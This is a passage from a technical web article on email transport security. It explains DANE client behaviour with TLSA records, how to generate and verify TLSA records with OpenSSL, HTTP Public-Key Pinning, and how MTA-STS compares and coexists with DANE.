<a href="https://en.wikipedia.org/wiki/Wildcard_character">wildcard character</a> <code>*</code> as the leftmost label.
For example, <code>*.example.com</code> would match <code>mail.example.com</code>.</li>
  </ol>

</details>

<details>
  <summary id="client-behavior">
Client behavior
</summary>

  <p>A <abbr title="Domain Name System">DNS</abbr> lookup with <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a> enabled
leads to one of the following three results
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc4035#section-4.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4035</a>:</p>
  <ul>
    <li><strong>Secure records</strong>: The returned resource records have a valid <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> signature,
where the zone’s signing key is confirmed recursively by the zone above up to the root zone.</li>
    <li><strong>Insecure records</strong>: The returned resource records belong to a zone which is either not signed
or signed with <a href="https://www.iana.org/assignments/dns-sec-alg-numbers/dns-sec-alg-numbers.xhtml">an algorithm</a>
which the client <a href="https://datatracker.ietf.org/doc/html/rfc4035#page-28">doesn’t support</a>.
Either case has to be confirmed by a secure parent zone.
If a zone is insecure, all of its subzones are also insecure.</li>
    <li><strong>Failure</strong>: The returned resource records belong to a zone which is signed, but they lack a valid <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> signature.
The lookup also fails if the client doesn’t receive a response to one of its queries.</li>
  </ul>

  <p>If a lookup involves indirections with <code>CNAME</code>, <code>MX</code>, or <code>SRV</code> records,
all the indirections have to be secure for the expanded domain to be considered secure.
Depending on the outcome of the <code>TLSA</code> lookup, <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients behave as follows:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th><abbr title="Domain Name System">DNS</abbr> lookups</th>
          <th><abbr title="TLSA is not an acronym but rather the name of a resource record type.">TLSA</abbr> availability</th>
          <th><abbr title="TLSA is not an acronym but rather the name of a resource record type.">TLSA</abbr> usability</th>
          <th>Client behavior</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>All secure</td>
          <td>Available</td>
          <td>Usable</td>
          <td><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-authenticated <abbr title="Transport Layer Security">TLS</abbr></td>
        </tr>
        <tr>
          <td>All secure</td>
          <td>Available</td>
          <td>Unusable</td>
          <td><code>MX</code>: Unauthenticated <abbr title="Transport Layer Security">TLS</abbr> <a href="https://datatracker.ietf.org/doc/html/rfc7672#section-2.2">↗</a></td>
        </tr>
        <tr>
          <td>All secure</td>
          <td>Unavailable</td>
          <td>–</td>
          <td>Pre-<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> <abbr title="Transport Layer Security">TLS</abbr></td>
        </tr>
        <tr>
          <td>Any insecure</td>
          <td>–</td>
          <td>–</td>
          <td>Pre-<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> <abbr title="Transport Layer Security">TLS</abbr> (or</td>
        </tr>
        <tr>
          <td>Any failure</td>
          <td>–</td>
          <td>–</td>
          <td>Continue with the next host;</td>
        </tr>
      </tbody>
    </table>

    <figcaption>

How the client has to handle the various situations according to
<a href="https://datatracker.ietf.org/doc/html/rfc7672#section-2.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7672</a> and
<a href="https://datatracker.ietf.org/doc/html/rfc7673#section-3.4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7673</a>.

</figcaption>
  </figure>

  <p>A couple of remarks on the above table:</p>
  <ul>
    <li>“All secure” means that all the <abbr title="Domain Name System">DNS</abbr> lookups to <a href="#name-checks">determine the <code>TLSA</code> domain</a>
as well as the <a href="#tlsa-record-location"><code>TLSA</code> lookup</a> are secure,
including potential <code>CNAME</code> indirections of the <code>TLSA</code> records.</li>
    <li>“Unusable” means that the <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> client does not support the
<a href="#multiple-tlsa-records">parameter combination of any <code>TLSA</code> record</a>.
By finding <code>TLSA</code> records, <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients know that the server supports <abbr title="Transport Layer Security">TLS</abbr>
and <a href="https://datatracker.ietf.org/doc/html/rfc7671#section-10.3">must not continue without it</a>
unless the protocol does not require authenticated <abbr title="Transport Layer Security">TLS</abbr>,
which is the case for <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>.</li>
    <li>“Unavailable” means that the client received an authenticated denial of existence of the <code>TLSA</code> records.</li>
    <li>“Pre-<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> <abbr title="Transport Layer Security">TLS</abbr>” stands for whatever clients did before the introduction of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>.
In the case of <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a>,
this means <a href="#transport-security">opportunistic <abbr title="Transport Layer Security">TLS</abbr></a>.
In the case of <a href="#json-meta-application-protocol"><abbr title="JSON Meta Application Protocol">JMAP</abbr></a>, which is used only with <abbr title="Transport Layer Security">TLS</abbr>,
this would mean <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-authenticated <abbr title="Transport Layer Security">TLS</abbr> once <abbr title="JSON Meta Application Protocol">JMAP</abbr>/<abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> adopts <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>.</li>
    <li>In the unexpected cases of the <a href="#name-checks">previous box</a>,
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients can enforce <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>-authentication even when some of the <abbr title="Domain Name System">DNS</abbr> lookups were insecure.</li>
    <li><code>MX</code> records <a href="https://datatracker.ietf.org/doc/html/rfc7672#section-2.2.1">must be sorted by preference</a>
and <code>SRV</code> records <a href="https://datatracker.ietf.org/doc/html/rfc7673#section-3.1">must be sorted by priority and weight</a>
without considering which hosts use <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> and <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>.</li>
    <li>If you want to test your configuration, you can deploy <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> only for your first <code>MX</code> host.
If there are any misconfigurations, <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients will deliver the message to the next <code>MX</code> host.
Once your <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> configuration works, you should deploy <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> for all your hosts.
Otherwise, an attacker can cause <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients to continue
without <a href="#server-authentication">server authentication</a> or even <abbr title="Transport Layer Security">TLS</abbr>.</li>
    <li><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> is backward compatible for all domains which deploy <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> correctly.
As long as a domain deploys neither <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> nor <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> with <code>TLSA</code> records,
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> clients communicate with its servers as if <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> doesn’t exist.</li>
    <li>In order to stop using <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, you just have to remove the <code>TLSA</code> records.</li>
  </ul>

</details>

<details>
  <summary id="how-to-generate-a-tlsa-record">
How to generate a <abbr title="TLSA is not an acronym but rather the name of a resource record type.">TLSA</abbr> record
</summary>

  <p>Before you deploy <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>,
make sure that <a href="#name-checks">all involved domains</a>
support <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
And even if you don’t use <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, you <a href="https://datatracker.ietf.org/doc/html/rfc7671#section-11">should activate</a>
the <a href="https://docs.gandi.net/en/domain_names/transfer_out/transfer_lock.html">transfer lock</a> on all your domains.
You can generate the <a href="#tlsa-record-type">certificate association data</a> with the following command:</p>

  

</details>

<details>
  <summary id="how-to-verify-a-tlsa-record">
How to verify a <abbr title="TLSA is not an acronym but rather the name of a resource record type.">TLSA</abbr> record
</summary>

  <p><a href="#openssl-versus-libressl">OpenSSL but not LibreSSL</a> has the option
<a href="https://www.openssl.org/docs/manmaster/man1/openssl-s_client.html#dane_tlsa_domain-domain"><code>-dane_tlsa_domain</code></a>
to configure the <a href="#name-checks"><code>TLSA</code> domain</a>, and the option
<a href="https://www.openssl.org/docs/manmaster/man1/openssl-s_client.html#dane_tlsa_rrdata-rrdata">-dane_tlsa_rrdata</a>
to provide one or several <a href="#tlsa-record-type"><code>TLSA</code> records</a>.
I covered how to install OpenSSL on macOS in an <a href="#install-openssl-on-macos">earlier box</a>.
The <a href="#tool-lookup-tlsa-records">above tool</a> generates the OpenSSL command for you.
Here is an example with <a href="https://en.wikipedia.org/wiki/ProtonMail">Proton Mail’s</a> <code>TLSA</code> records at the time of writing:</p>

  
  

  <p>Make sure that you use the option
<a href="https://www.openssl.org/docs/manmaster/man1/openssl-s_client.html#verify_return_error"><code>-verify_return_error</code></a>.
Otherwise, OpenSSL continues the session even if there was a verification error.
If you feel adventurous, you can also generate the certificate association data
for a <code>TLSA</code> record with the parameters <code>3</code> <code>1</code> <code>1</code> using the following command
and compare the output with the <code>TLSA</code> record yourself:</p>

  <figure>
    
    <figcaption>

How to compute the <a href="#tlsa-record-type">certificate association data</a> directly from the server certificate.
<code>2&gt;</code> <code>/dev/null</code> suppresses the <a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_error_(stderr)">error output</a>.

</figcaption>
  </figure>

</details>

<details>
  <summary id="how-to-activate-dane">
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> on outgoing mail server
</summary>

  <p>Configuring <code>TLSA</code> records for your incoming mail servers is only half the battle.
If you run incoming mail servers, you almost certainly also operate an outgoing mail server.
Having <code>TLSA</code> records for your incoming mail servers allows others to deliver email securely to you,
but you also want to make sure that your messages are delivered securely to others.
Even if you don’t configure <code>TLSA</code> records for your incoming mail servers,
you should activate <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> on your outgoing mail server
so that it authenticates the incoming mail servers of your recipients before delivering your messages.
Both <a href="http://www.postfix.org/TLS_README.html#client_tls_dane">Postfix</a> and
<a href="https://www.exim.org/exim-html-current/doc/html/spec_html/ch-encrypted_smtp_connections_using_tlsssl.html#SECDANE">Exim</a>
support <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>.
<a href="https://github.com/internetstandards/toolbox-wiki/blob/master/DANE-for-SMTP-how-to.md#implementing-dane-for-smtp-on-postfix-inbound--outbound-e-mail-traffic">This guide</a>
shows you how to configure them.
The number of mail servers with <code>TLSA</code> records is <a href="https://stats.dnssec-tools.org/">rising steadily</a>.
Here are <a href="https://stats.sidnlabs.nl/en/mail.html">some statistics</a> for the
<a href="https://en.wikipedia.org/wiki/.nl"><code>.nl</code> top-level domain</a>.</p>

</details>

<details>
  <summary id="http-public-key-pinning">
<abbr title="HyperText Transfer Protocol">HTTP</abbr> Public-Key Pinning (<abbr title="HTTP Public-Key Pinning">HPKP</abbr>)
</summary>

  <p>As mentioned in the <a href="#pki-comparison"><abbr title="Public Key Infrastructure">PKI</abbr> comparison</a>,
any <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certification authority can usually issue a certificate for any domain,
and thus a single compromised certification authority compromises the security of the whole system.
This problem exists wherever <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> is used, including the <a href="https://en.wikipedia.org/wiki/World_Wide_Web">Web</a>.
On the Web, it was addressed by <a href="https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning"><abbr title="HyperText Transfer Protocol">HTTP</abbr> Public-Key Pinning (<abbr title="HTTP Public-Key Pinning">HPKP</abbr>)</a>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc7469"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7469</a>
and <a href="https://caniuse.com/publickeypinning">is no longer supported</a> by any relevant browser.
When accessing a website with <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>, the server could include a
<a href="https://datatracker.ietf.org/doc/html/rfc7469#section-2.1"><code>Public-Key-Pins</code> header field</a> in its response
to list hashes of <a href="https://evalapply.org/internet/#digital-signatures">public keys</a>.
Browsers then stored these hashes for the specified validity period, during which they required
that a public key in the server’s certificate chain matched one of the hashes pinned for the given domain.
Each pin is the <a href="#content-encoding">Base64-encoded</a> <a href="#secure-hash-algorithms"><abbr title="Secure Hash Algorithm">SHA</abbr>-256 hash</a> of the
<a href="https://en.wikipedia.org/wiki/X.690#DER_encoding">DER-encoded</a>
<a href="https://en.wikipedia.org/wiki/X.509#Structure_of_a_certificate">SubjectPublicKeyInfo (<abbr title="SubjectPublicKeyInfo (a binary structure of X.509 certificates)">SPKI</abbr>)</a>.
The public key can belong to the server, an intermediate certification authority, or a root certification authority.
<abbr title="HTTP Public-Key Pinning">HPKP</abbr> thus corresponds to <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> with <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="Trust Anchor">TA</abbr> or <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-<abbr title="End Entity">EE</abbr> as the certificate usage,
<abbr title="SubjectPublicKeyInfo (a binary structure of X.509 certificates)">SPKI</abbr> as the selector, and <abbr title="Secure Hash Algorithm">SHA</abbr>-256 as the matching type with another encoding of the hash.
But unlike <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, the information is conveyed in a previous <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr> response instead of the <abbr title="Domain Name System">DNS</abbr>,
which means that connections with expired or missing pins are not protected by <abbr title="HTTP Public-Key Pinning">HPKP</abbr>.
The standard requires that one of the pins matches no certificate in the certificate chain
in order to force administrators to include a <a href="https://datatracker.ietf.org/doc/html/rfc7469#section-4.3">backup pin</a>.
This did not prevent people from making their domains unusable by losing access to their keys,
which could also happen due to <a href="https://en.wikipedia.org/wiki/Ransomware">ransomware</a>.
Additionally, an attacker who could compromise the first secure connection
could make the legitimate website inaccessible.
While <abbr title="HTTP Public-Key Pinning">HPKP</abbr> was nice in theory, it caused so many problems in practice that it was discontinued.
Let’s look at an example:</p>

  <figure>

    <div><div><pre><code>Public-Key-Pins: max-age=2592000; includeSubDomains;
   pin-sha256=&#34;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&#34;;
   pin-sha256=&#34;LPJNul+wow4m6DsqxbninhsWHlwfp0JecwQzYpOLmCQ=&#34;;
   report-uri=&#34;https://other.example.com/pkp-report&#34;
</code></pre></div>    </div>

    <figcaption>

A <code>Public-Key-Pins</code> response header field with a validity period of 30 days
and a <a href="https://datatracker.ietf.org/doc/html/rfc7469#section-2.1.4">report <abbr title="Uniform Resource Identifier (a format for unique resource names)">URI</abbr></a>
for <a href="https://datatracker.ietf.org/doc/html/rfc7469#section-3">validation failures</a>.

</figcaption>
  </figure>

</details>

<h4 id="mail-transfer-agent-strict-transport-security">Mail Transfer Agent Strict Transport Security (<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>)</h4>

<p><a href="https://en.wikipedia.org/wiki/MTA-STS">Mail Transfer Agent Strict Transport Security (<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>)</a>
is specified in <a href="https://datatracker.ietf.org/doc/html/rfc8461"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8461</a>.
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> is a <a href="#server-authentication"><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr></a>-based <a href="#comparison-to-dane">alternative to <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a> for those
who cannot or don’t want to deploy <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a> on their domain.
It lets receiving domains indicate their support for <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr>-authenticated <abbr title="Transport Layer Security">TLS</abbr> with the following two resources:</p>
<ul>
  <li><a href="#mta-sts-dns-record"><strong><abbr title="Domain Name System">DNS</abbr> record</strong></a>:
A <code>TXT</code> record is used to inform the sender that the receiving domain has an <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy
and whether the policy has been changed since the last time the sender retrieved it.
Since small <abbr title="Domain Name System">DNS</abbr> records are retrieved with <a href="https://evalapply.org/internet/#user-datagram-protocol">UDP</a>,
this is much faster than retrieving the policy file,
which requires a <a href="https://evalapply.org/internet/#transmission-control-protocol"><abbr title="Transmission Control Protocol">TCP</abbr></a>
and a <a href="https://evalapply.org/internet/#transport-layer-security"><abbr title="Transport Layer Security">TLS</abbr></a> <a href="https://evalapply.org/internet/#communication-channel">handshake</a>.</li>
  <li><a href="#mta-sts-policy-file"><strong>Policy file</strong></a>:
The sender fetches the <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy with <a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr></a> from the receiving domain.
The <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy indicates what the sender shall do
if it cannot authenticate the incoming mail server of the recipient with the presented <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificate.
Since <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> doesn’t require that <abbr title="Domain Name System">DNS</abbr> records are authenticated with <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>,
the policy file is also used to authenticate the <code>MX</code> records of the receiving domain.
This allows clients to match the presented certificate against <a href="#name-checks">the name of the mail server</a>.</li>
</ul>

<p>The tool below queries the MTS-<abbr title="Strict Transport Security">STS</abbr> record and the policy file of the given domain.
It uses <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a> for the <abbr title="Domain Name System">DNS</abbr> query
and the <a href="https://github.com/KasparEtter/email-tracker">email tracking server</a>,
which I’ve deployed on <a href="https://render.com/">render.com</a>,
as a <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy server</a>.
This is necessary because the policy file is usually served without the header field required
for <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">cross-origin resource sharing (<abbr title="Cross-Origin Resource Sharing">CORS</abbr>)</a>.
As you can see in <a href="https://github.com/KasparEtter/email-tracker/blob/main/main.ts">its source code</a>,
my server doesn’t store anything.
While Render probably logs your requests, I don’t have access to such logs.
The tool checks the syntax of the <abbr title="Domain Name System">DNS</abbr> record and the policy file,
but it verifies neither the <code>MX</code> records nor whether the mail server has a valid <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificate.</p>



<details>
  <summary id="comparison-to-dane">
Comparison to <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>
</summary>

  <p><a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a> differs from
<a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a> in several important ways:</p>
  <ul>
    <li><strong><abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> instead of <abbr title="Domain Name System Security Extensions">DNSSEC</abbr></strong>:
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> relies on the traditional <a href="https://evalapply.org/internet/#public-key-infrastructure">public-key infrastructure (<abbr title="Public Key Infrastructure">PKI</abbr>)</a>
based on <a href="https://en.wikipedia.org/wiki/X.509"><abbr title="A standard defining the format of public key certificates">X.509</abbr> certificates</a>
issued by pre-configured <a href="https://en.wikipedia.org/wiki/Certificate_authority">certification authorities (<abbr title="Certification Authorities">CAs</abbr>)</a>.
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, on the other hand, relies on <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>
to bind <a href="https://evalapply.org/internet/#digital-signatures">public keys</a> to domain names.
I’ve compared the two approaches in a <a href="#pki-comparison">previous box</a>.</li>
    <li><strong><code>@</code> domain instead of <code>MX</code> domain</strong>:
The <a href="#mta-sts-dns-record"><code>TXT</code> record</a> and the <a href="#mta-sts-policy-file">policy file</a>
of <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> are stored on the domain after the <code>@</code> symbol in the recipient’s email address,
whereas the <a href="#tlsa-record-type"><code>TLSA</code> records</a> of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> are configured
<a href="#tlsa-record-location">on the domains listed in the <code>MX</code> records</a>
(at least in <a href="#name-checks">ordinary setups</a>).</li>
    <li><strong>No strict downgrade resistance</strong>:
Unlike <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>, which provides downgrade resistance thanks to <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>’s authenticated denial of existence,
the <abbr title="Domain Name System">DNS</abbr> record and the policy file of <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> can be
<a href="https://datatracker.ietf.org/doc/html/rfc8461#section-10.2">censored by an active attacker</a>.
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> provides downgrade resistance only for the duration for which the recipient’s policy is being cached.
As we will see <a href="#mta-sts-policy-file">later</a>,
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> has a provision which allows administrators to detect policy refresh failures.</li>
    <li><strong>Different test modes</strong>:
If you want to test your deployment of <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>,
you can configure <code>TLSA</code> records for just some of your mail servers.
<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>, on the other hand, has an explicit mode for testing,
which is intended to be used in combination with <a href="#smtp-tls-reporting-tlsrpt"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> <abbr title="Transport Layer Security">TLS</abbr> Reporting (<abbr title="SMTP TLS Reporting">TLSRPT</abbr>)</a>.
Such a test mode is necessary because the <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> policy affects the whole domain.</li>
    <li><strong>No support from mailbox providers required</strong>:
If your incoming mail server uses a valid <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificate for its domain,
you can deploy <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> on your custom domain without explicit support from your mailbox provider.
It’s unlikely that your mailbox provider stops using valid <abbr title="Public Key Infrastructure using X.509 certificates from vendor-configured certification authorities">PKIX</abbr> certificates for their servers
unless they start using <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>.
In order to be on the safe side, you may want to contact your mailbox provider in any case.</li>
  </ul>

</details>

<details>
  <summary id="coexistence-with-dane">
Coexistence with <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>
</summary>

  <p>As long as some <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a> clients
support <a href="#dns-based-authentication-of-named-entities"><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></a>
but not <a href="#mail-transfer-agent-strict-transport-security"><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></a> and vice versa,
you can deploy both <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> and <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> on your domain to achieve the best security.
<a href="https://datatracker.ietf.org/doc/html/rfc8461#section-2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8461</a> states explicitly
that <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> may not override a failed <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> validation.
Unfortunately, it doesn’t say anything about whether <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> can override a failed <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> validation:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th><abbr title="DNS-Based Authentication of Named Entities">DANE</abbr></th>
          <th><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr></th>
          <th>Result</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
        <tr>
          <td><i></i></td>
          <td><i></i></td>
          <td><i></i></td>
        </tr>
      </tbody>
    </table>

    <figcaption>

Can <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> override a failed <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> validation?
Unfortunately, the standards are silent on this.

</figcaption>
  </figure>

  <p>In my opinion, a successful <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> authentication should take precedence over a failed <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> validation
as this would allow domain owners to deploy <a href="#transport-security">transport security</a>
without the support of their mailbox provider by deploying <abbr title="Domain Name System Security Extensions">DNSSEC</abbr> and <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>.
If the mailbox provider switches to <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> with self-signed certificates,
clients which support <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> and <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> would continue to deliver emails to this domain
even if <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> validation now fails.</p>

  <p>If you deploy either <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> or <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>, I advise you to deploy <abbr title="DNS-Based Authentication of Named Entities">DANE</abbr>,
assuming that your <a href="https://en.wikipedia.org/wiki/Domain_name_registrar">domain name registrar</a>
or <a href="https://en.wikipedia.org/wiki/Name_server">name server provider</a>
supports <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
<abbr title="DNS-Based Authentication of Named Entities">DANE</abbr> is more elegant and provides better security than <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr>.
The only reason we have <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>-<abbr title="Strict Transport Security">STS</abbr> is because some large companies are reluctant to deploy <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>.
All I know is that <a href="https://www.imperialviolet.org/2015/01/17/notdane.html">Google wants to get rid of</a>
1024-bit <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)"><abbr title="Rivest, Shamir, Adleman (the name of a popular cryptosystem)">RSA</abbr></a>
and focuses on <a href="https://certificate.transparency.dev/">Certificate Transparency</a>.
But given that <a href="https://datatracker.ietf.org/doc/html/rfc6605"><abbr title="Elliptic-Curve Digital Signature Algorithm">ECDSA</abbr></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc8080"><abbr title="Edwards-curve digital signature algorithm using SHA-512 (SHA-2) and Curve25519">Ed25519</abbr>, and <abbr title="Edwards-curve digital signature algorithm using SHAKE256 (SHA-3) and Curve448">Ed448</abbr></a>
can be <a href="https://blog.apnic.net/2016/10/06/dnssec-and-ecdsa/">used for <abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>
and that both the <a href="https://en.wikipedia.org/wiki/DNS_root_zone">root zone</a>
and the <a href="https://en.wikipedia.org/wiki/.com"><code>.com</code> domain</a> use 2048-bit <abbr title="Rivest, Shamir, Adleman (the name of a popular cryptosystem)">RSA</abbr> at least for their key-signing keys,
weak cryptography is no longer an argument against <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>,
